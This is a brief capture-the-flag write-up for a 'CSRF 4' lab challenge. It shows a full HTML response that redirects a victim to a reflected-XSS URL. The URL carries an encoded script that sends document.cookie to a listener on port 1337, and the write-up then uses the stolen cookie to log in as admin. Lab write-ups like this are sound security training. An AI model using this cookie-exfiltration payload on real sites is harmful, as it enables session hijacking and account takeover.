# CSRF 4

#### Pretty much same as last challenge, just need to change the script from alert(PWNED) to a document.cookie fetch():
```
HTTP/1.1 200 OK
Content-type: text/html

<html>
<head>
	<meta http-equiv="refresh" content="0; url=http://challenge.localhost/ephemeral?msg=%3cscript%3efetch%28%27http%3a//challenge%2elocalhost%3a1337/%3d%3fc%3d%27%2bdocument.cookie%29%3c/script%3e">
	</head>
</html>
```

-----------------------------

#### Use the cookie to login as admin. Look at the python or netcat server and copy from . --> } as the password.
